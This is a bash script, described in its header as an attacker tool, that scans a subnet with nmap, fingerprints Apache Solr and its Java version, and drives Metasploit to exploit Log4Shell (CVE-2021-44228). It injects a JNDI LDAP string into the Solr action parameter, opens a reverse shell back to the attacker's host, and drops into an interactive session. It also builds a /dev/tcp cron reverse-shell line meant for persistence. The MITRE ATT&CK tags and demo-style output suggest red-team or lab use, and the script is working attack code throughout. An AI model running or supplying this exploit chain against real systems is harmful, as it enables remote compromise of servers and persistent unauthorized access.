#!/bin/bash
# host-scan.sh - Network reconnaissance, vulnerability scanning, and exploitation
#
# A generic attacker script that scans a subnet, discovers services,
# identifies vulnerabilities, and exploits what it finds. Follows a
# realistic attacker workflow mapped to MITRE ATT&CK.
#
# Prerequisites:
#   - nmap installed
#   - Metasploit Framework installed (msfconsole)
#   - nuclei installed (optional, enhances vuln confirmation)
#   - Network connectivity between attacker and targets
#
# Usage:
#   ./host-scan.sh -s <SUBNET> -a <ATTACKER_IP> [-p <LPORT>]
#   ./host-scan.sh -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]
#
# Examples:
#   # Full recon + exploit against a subnet
#   ./host-scan.sh -s 10.0.1.0/24 -a 10.0.1.200
#
#   # Skip recon, exploit a known target directly
#   ./host-scan.sh -t 10.0.1.10 -a 10.0.1.200

set -euo pipefail

# --- Pre-flight: verify required tools ---
for cmd in nmap curl python3 msfconsole; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "FATAL: Required tool '$cmd' not found. Install it before running this script."
        exit 1
    fi
done

# Defaults
LPORT=4444
PERSISTENCE_PORT=4445
SUBNET=""
TARGET_IP=""
ATTACKER_IP=""
SKIP_RECON=false

# Ports to scan during recon
SCAN_PORTS="22,80,443,8080,8443,8983,9200,9300,3306,5432,6379,27017"

usage() {
    echo "Usage: $0 -s <SUBNET> -a <ATTACKER_IP> [-p <LPORT>]"
    echo "       $0 -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]"
    echo ""
    echo "  -s    Subnet to scan (e.g., 10.0.1.0/24)"
    echo "  -t    Skip recon, exploit this target directly"
    echo "  -a    Attacker IP address (this machine)"
    echo "  -p    Listener port for reverse shell (default: 4444)"
    echo ""
    echo "Examples:"
    echo "  $0 -s 10.0.1.0/24 -a 10.0.1.200"
    echo "  $0 -t 10.0.1.10 -a 10.0.1.200"
    exit 1
}

while getopts "s:t:a:p:h" opt; do
    case $opt in
        s) SUBNET="$OPTARG" ;;
        t) TARGET_IP="$OPTARG"; SKIP_RECON=true ;;
        a) ATTACKER_IP="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "${ATTACKER_IP}" ]]; then
    echo "ERROR: -a (attacker IP) is required."
    echo ""
    usage
fi

if [[ -z "${SUBNET}" && -z "${TARGET_IP}" ]]; then
    echo "ERROR: Either -s (subnet) or -t (target) is required."
    echo ""
    usage
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log() { echo -e "${MAGENTA}[host-scan]${NC} $1"; }
phase() {
    echo ""
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo -e "${MAGENTA}[host-scan]${NC} ${WHITE}PHASE $1: $2${NC}"
    echo -e "${MAGENTA}[host-scan]${NC} ${CYAN}MITRE ATT&CK: $3${NC}"
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo ""
    echo -e "${MAGENTA}[host-scan]${NC} $4"
    echo ""
    sleep 2
}

# Display a command as if being typed, run it, show output, and pause.
# Usage: show_cmd "nmap -sV ..." [delay_after]
show_cmd() {
    local cmd="$1"
    local delay="${2:-2}"

    # Print fake prompt then type out the command
    printf "${CYAN}\$ ${NC}"
    for (( i=0; i<${#cmd}; i++ )); do
        printf "${GREEN}%s${NC}" "${cmd:$i:1}"
        sleep 0.02
    done
    echo ""
    sleep 0.3

    # Run the command and display output
    eval "$cmd" 2>&1
    echo ""
    sleep "$delay"
}

# Working directory for scan outputs
WORKDIR="/tmp/host-scan-$$"
mkdir -p "$WORKDIR"

# Clean up previous runs and ensure clean exit
cleanup() {
    pkill -9 msfconsole 2>/dev/null || true
    pkill -9 -f "nc.*${LPORT}" 2>/dev/null || true
    pkill -9 -f "nc.*${PERSISTENCE_PORT}" 2>/dev/null || true
    rm -f /tmp/host-scan.rc 2>/dev/null || true
    sleep 1
}

trap 'cleanup; rm -rf "$WORKDIR" 2>/dev/null || true' EXIT

# Wait for Solr to be fully operational (API returns valid JSON)
wait_for_solr() {
    local target="$1"
    local max_attempts=30
    local attempt=0
    log "Waiting for Solr on ${target}:8983 to be ready..."
    while [ $attempt -lt $max_attempts ]; do
        if curl -sf --connect-timeout 3 "http://${target}:8983/solr/admin/info/system" 2>/dev/null | \
           python3 -c "import sys,json; json.load(sys.stdin)" >/dev/null 2>&1; then
            log "${GREEN}Solr on ${target} is ready.${NC}"
            return 0
        fi
        sleep 2
        ((attempt++))
    done
    log "${RED}WARNING: Solr on ${target} not ready after ${max_attempts} attempts.${NC}"
    return 1
}

# Ensure ports needed for exploitation are free
free_ports() {
    for port in ${LPORT} ${PERSISTENCE_PORT} 1389 8080; do
        if ss -tuln 2>/dev/null | grep -q ":${port} "; then
            log "${YELLOW}Port ${port} in use — killing previous process...${NC}"
            fuser -k "${port}/tcp" 2>/dev/null || true
            sleep 1
        fi
    done
}

# --- Banner ---
echo ""
echo -e "${RED} _   _           _     ____                  ${NC}"
echo -e "${RED}| | | | ___  ___| |_  / ___|  ___ __ _ _ __  ${NC}"
echo -e "${RED}| |_| |/ _ \\/ __| __| \\___ \\ / __/ _\` | '_ \\ ${NC}"
echo -e "${RED}|  _  | (_) \\__ \\ |_   ___) | (_| (_| | | | |${NC}"
echo -e "${RED}|_| |_|\\___/|___/\\__| |____/ \\___\\__,_|_| |_|${NC}"
echo ""
echo -e "${WHITE}    Network Recon + Vulnerability Exploitation${NC}"
echo ""

log "Attacker:  ${ATTACKER_IP}"
log "Port:      ${LPORT}"
if [[ -n "$SUBNET" ]]; then
    log "Subnet:    ${SUBNET}"
fi
if [[ -n "$TARGET_IP" ]]; then
    log "Target:    ${TARGET_IP}"
fi
echo ""

# ============================================================================
# PHASE 1 — RECON: Network Discovery and Service Enumeration
# ============================================================================

# Track what we find
declare -a LIVE_HOSTS=()
declare -a EXPLOITABLE_HOSTS=()
EXPLOIT_TYPE=""
EXPLOIT_PORT=""

if [[ "$SKIP_RECON" == "false" ]]; then

    phase "1a" "NETWORK DISCOVERY" "T1046 - Network Service Discovery" \
        "Scanning ${SUBNET} for live hosts and open services."

    NMAP_OUTPUT="${WORKDIR}/nmap-scan.gnmap"
    NMAP_FULL="${WORKDIR}/nmap-scan.txt"
    show_cmd "nmap -sV -p ${SCAN_PORTS} --open ${SUBNET} -oG ${NMAP_OUTPUT} -oN ${NMAP_FULL}" 3

    # Parse nmap results — collect all hosts with any open port
    while IFS= read -r line; do
        host=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
        if [[ -n "$host" && "$host" != "$ATTACKER_IP" ]]; then
            if [[ ! " ${LIVE_HOSTS[*]:-} " =~ " ${host} " ]]; then
                LIVE_HOSTS+=("$host")
            fi
        fi
    done < <(grep "/open/" "${NMAP_OUTPUT}" 2>/dev/null || true)

    if [[ ${#LIVE_HOSTS[@]} -eq 0 ]]; then
        log "${RED}No live hosts found. Exiting.${NC}"
        rm -rf "$WORKDIR"
        exit 1
    fi

    log "Found ${GREEN}${#LIVE_HOSTS[@]}${NC} live host(s) with open ports."
    for h in "${LIVE_HOSTS[@]}"; do
        PORTS=$(grep "$h" "${NMAP_OUTPUT}" | grep -oP '\d+/open' | tr '\n' ' ')
        log "  ${h}: ${PORTS}"
    done
    sleep 2
    echo ""

    # Step 2: Fingerprint services via API
    phase "1b" "SERVICE FINGERPRINTING" "T1592.002 - Gather Victim Host Information: Software" \
        "Querying Solr admin API on each discovered host."

    # Ensure Solr is ready on discovered hosts before fingerprinting
    for host in "${LIVE_HOSTS[@]}"; do
        if grep -q "${host}.*8983/open" "${NMAP_OUTPUT}" 2>/dev/null; then
            wait_for_solr "$host"
        fi
    done

    for host in "${LIVE_HOSTS[@]}"; do
        # Only probe hosts with 8983 open
        if ! grep -q "${host}.*8983/open" "${NMAP_OUTPUT}" 2>/dev/null; then
            continue
        fi

        show_cmd "curl -s http://${host}:8983/solr/admin/info/system | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'Solr: {d[\\\"lucene\\\"][\\\"solr-spec-version\\\"]}, Java: {d[\\\"jvm\\\"][\\\"version\\\"]}')\"" 1

        # Capture values for internal tracking
        SOLR_INFO=$(curl -sk --connect-timeout 5 "http://${host}:8983/solr/admin/info/system" 2>/dev/null || echo "")
        if [[ -n "$SOLR_INFO" ]]; then
            SOLR_VER=$(echo "$SOLR_INFO" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d['lucene']['solr-spec-version'])
except:
    print('unknown')
" 2>/dev/null)

            JAVA_VER=$(echo "$SOLR_INFO" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d['jvm']['version'])
except:
    print('unknown')
" 2>/dev/null)

            # Assess vulnerability
            if [[ "$SOLR_VER" =~ ^8\. && "$SOLR_VER" < "8.11.1" ]]; then
                JDK_UPDATE=$(echo "$JAVA_VER" | grep -oP '1\.8\.0_\K\d+' || echo "999")
                if [[ "$JDK_UPDATE" -lt 191 ]]; then
                    log "${RED}  VULNERABLE: Solr ${SOLR_VER} + Log4j 2.14.1, JDK 8u${JDK_UPDATE} < 8u191 (CVE-2021-44228)${NC}"
                    EXPLOITABLE_HOSTS+=("$host")
                    EXPLOIT_TYPE="log4shell"
                    EXPLOIT_PORT="8983"
                else
                    log "${YELLOW}  Solr ${SOLR_VER} + Log4j 2.14.1, but JDK 8u${JDK_UPDATE} >= 8u191 (JNDI restricted)${NC}"
                fi
            elif [[ "$SOLR_VER" != "unknown" ]]; then
                log "${GREEN}  Solr ${SOLR_VER} — Log4j patched${NC}"
            fi
        fi
        sleep 2
        echo ""
    done

    # Step 3: Vulnerability scanning with nuclei (if available)
    if command -v nuclei &>/dev/null && [[ ${#EXPLOITABLE_HOSTS[@]} -gt 0 ]]; then
        phase "1c" "VULNERABILITY CONFIRMATION" "T1595.002 - Active Scanning: Vulnerability Scanning" \
            "Confirming exploitability via nuclei OOB callbacks."

        TARGETS_FILE="${WORKDIR}/targets.txt"
        for host in "${EXPLOITABLE_HOSTS[@]}"; do
            echo "http://${host}:${EXPLOIT_PORT}" >> "$TARGETS_FILE"
        done

        NUCLEI_OUTPUT="${WORKDIR}/nuclei-results.txt"
        show_cmd "nuclei -l ${TARGETS_FILE} -severity critical,high -o ${NUCLEI_OUTPUT}" 3

        if [[ -s "$NUCLEI_OUTPUT" ]]; then
            log "${GREEN}Confirmed:${NC}"
            while IFS= read -r line; do
                log "  ${RED}${line}${NC}"
            done < "$NUCLEI_OUTPUT"
        else
            log "${YELLOW}No OOB callbacks received (interactsh may be unavailable). Proceeding on version data.${NC}"
        fi
        sleep 2
        echo ""
    fi

    # Recon summary
    echo ""
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    log "${WHITE}RECON SUMMARY${NC}"
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo ""
    log "Hosts discovered:   ${#LIVE_HOSTS[@]}"
    log "Exploitable:        ${#EXPLOITABLE_HOSTS[@]}"
    if [[ -n "$EXPLOIT_TYPE" ]]; then
        log "Exploit available:  ${EXPLOIT_TYPE} (CVE-2021-44228)"
    fi
    echo ""

    if [[ ${#EXPLOITABLE_HOSTS[@]} -eq 0 ]]; then
        log "${YELLOW}No exploitable targets found. Exiting.${NC}"
        log "Scan results saved to ${WORKDIR}/"
        exit 0
    fi

    for h in "${EXPLOITABLE_HOSTS[@]}"; do
        log "  ${RED}${h}:${EXPLOIT_PORT} — ${EXPLOIT_TYPE}${NC}"
    done
    echo ""

    # Pick the first exploitable host
    TARGET_IP="${EXPLOITABLE_HOSTS[0]}"
    log "Selected target: ${WHITE}${TARGET_IP}${NC}"
    sleep 3
    echo ""

else
    # Skip recon — user provided a target directly
    log "Targeting ${TARGET_IP} directly."
    EXPLOIT_TYPE="log4shell"
    EXPLOIT_PORT=8983

    phase "1" "TARGET VERIFICATION" "T1592.002 - Gather Victim Host Information: Software" \
        "Fingerprinting target service."

    wait_for_solr "$TARGET_IP"

    show_cmd "curl -s http://${TARGET_IP}:${EXPLOIT_PORT}/solr/admin/info/system | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'Solr: {d[\\\"lucene\\\"][\\\"solr-spec-version\\\"]}, Java: {d[\\\"jvm\\\"][\\\"version\\\"]}')\"" 2

    if curl -s --connect-timeout 5 "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/" > /dev/null 2>&1; then
        log "${GREEN}Target reachable on port ${EXPLOIT_PORT}.${NC}"
    else
        log "${RED}WARNING: Cannot reach ${TARGET_IP}:${EXPLOIT_PORT}${NC}"
    fi
    sleep 2
    echo ""
fi

# ============================================================================
# PHASE 2+ — EXPLOITATION (dispatched by vulnerability type)
# ============================================================================

if [[ "$EXPLOIT_TYPE" == "log4shell" ]]; then

    # Build the cron job payload (base64 encoded to avoid escaping issues)
    CRON_LINE="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PERSISTENCE_PORT} 0>&1'"
    CRON_B64=$(echo "$CRON_LINE" | base64 -w0 2>/dev/null || echo "$CRON_LINE" | base64 2>/dev/null)

    # Build the Metasploit resource script
    build_rc() {
        cat > /tmp/host-scan.rc << RCEOF
# ============================================================================
# CLEANUP
# ============================================================================
sessions -K
jobs -K

# ============================================================================
# PHASE 2: INITIAL ACCESS — Log4Shell (CVE-2021-44228)
# ============================================================================
# The log4shell_header_injection module sets up the LDAP and HTTP servers
# needed for the JNDI exploitation chain, but Solr doesn't log HTTP headers
# through Log4j. We run the module as a background job to keep the servers
# running, then inject the JNDI string via a Solr query parameter (which
# IS logged through Log4j).
use exploit/multi/http/log4shell_header_injection

set RHOSTS ${TARGET_IP}
set RPORT ${EXPLOIT_PORT}
set SRVHOST ${ATTACKER_IP}
set SRVPORT 1389
set TARGETURI /solr/admin/cores
set HTTP_HEADER User-Agent
set PAYLOAD java/shell_reverse_tcp
set LHOST ${ATTACKER_IP}
set LPORT ${LPORT}
set ForceExploit true
set AutoCheck false
set WfsDelay 60

exploit -j -z

<ruby>
# Helper: run a command on the session and display it
def run_cmd(cmd, session_id)
  print "\033[0;36m\$ \033[0m"
  cmd.each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
  puts ""
  sleep(0.25)
  run_single("sessions -c '#{cmd}' #{session_id}")
  sleep(0.5)
end

# Wait for the LDAP and HTTP servers to start (verify ports are listening)
puts "\033[0;35m[host-scan]\033[0m Waiting for LDAP/HTTP servers to start..."
require 'socket'
[1389, 8080].each do |port|
  ready = false
  20.times do
    begin
      s = TCPSocket.new('127.0.0.1', port)
      s.close
      ready = true
      break
    rescue
      sleep(1)
    end
  end
  if ready
    puts "\033[0;35m[host-scan]\033[0m   Port #{port} is listening."
  else
    puts "\033[0;35m[host-scan]\033[0m \033[0;31m  WARNING: Port #{port} not listening after 20s\033[0m"
  end
end

# Inject JNDI payload via Solr query parameter (which IS logged by Log4j)
jndi_str = "\${jndi:ldap://${ATTACKER_IP}:1389/exploit}"
target_url = "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/admin/cores?action=#{jndi_str}"
puts "\033[0;35m[host-scan]\033[0m Sending JNDI injection via Solr action parameter..."
puts "\033[0;35m[host-scan]\033[0m   URL: #{target_url}"
puts ""

require 'net/http'
begin
  uri = URI(target_url)
  Net::HTTP.get_response(uri)
  puts "\033[0;35m[host-scan]\033[0m Request sent. Waiting for reverse shell..."
rescue => e
  puts "\033[0;35m[host-scan]\033[0m Request sent (#{e.message}). Waiting for reverse shell..."
end

# Wait for the target to process JNDI lookup -> LDAP -> HTTP -> reverse shell
120.times do |i|
  sleep(1)
  break if framework.sessions.count > 0
  if (i + 1) % 10 == 0
    puts "\033[0;35m[host-scan]\033[0m   [#{i + 1}s] Waiting for reverse shell..."
  end
end
puts ""

# Check if we got a session
if framework.sessions.count == 0
  puts ""
  puts "\033[0;35m[host-scan]\033[0m \033[0;31mFAILED: No reverse shell established.\033[0m"
  puts "\033[0;35m[host-scan]\033[0m Possible causes:"
  puts "\033[0;35m[host-scan]\033[0m   - Target JDK >= 8u191 (JNDI class loading restricted)"
  puts "\033[0;35m[host-scan]\033[0m   - Target Log4j patched (>= 2.17.0)"
  puts "\033[0;35m[host-scan]\033[0m   - Firewall blocking ports 1389/8080 from target to attacker"
  puts "\033[0;35m[host-scan]\033[0m   - Check: iptables -L -n on attacker"
  puts ""
  run_single("jobs -K")
  run_single("exit")
end

\$session_id = framework.sessions.keys.first
puts ""
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
puts ""
puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established.\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Dropping into interactive session #{\$session_id}..."
puts "\033[0;35m[host-scan]\033[0m Type commands directly. Type 'exit' or Ctrl+C to disconnect."
puts ""

# Drop into the interactive shell session
run_single("sessions -i #{\$session_id}")
</ruby>

jobs -K
exit
RCEOF
    }

    # --- Run the exploit ---
    log "Cleaning up previous sessions..."
    cleanup

    log "Ensuring required ports are free..."
    free_ports

    log "Building Metasploit resource script..."
    build_rc

    phase "2" "INITIAL ACCESS" "T1190 - Exploit Public-Facing Application" \
        "Exploiting Log4Shell (CVE-2021-44228) via JNDI injection in Solr action parameter.
    Target: ${TARGET_IP}:${EXPLOIT_PORT}
    Metasploit starts rogue LDAP server (port 1389) and HTTP server (port 8080).
    Target's Log4j resolves the JNDI lookup, fetches malicious class, opens reverse shell."

    log "Launching Metasploit..."
    echo ""
    msfconsole -q -r /tmp/host-scan.rc

else
    log "${YELLOW}No supported exploit for type: ${EXPLOIT_TYPE}${NC}"
    log "Scan results saved to ${WORKDIR}/"
    exit 1
fi

echo ""
log "${GREEN}Attack complete.${NC}"
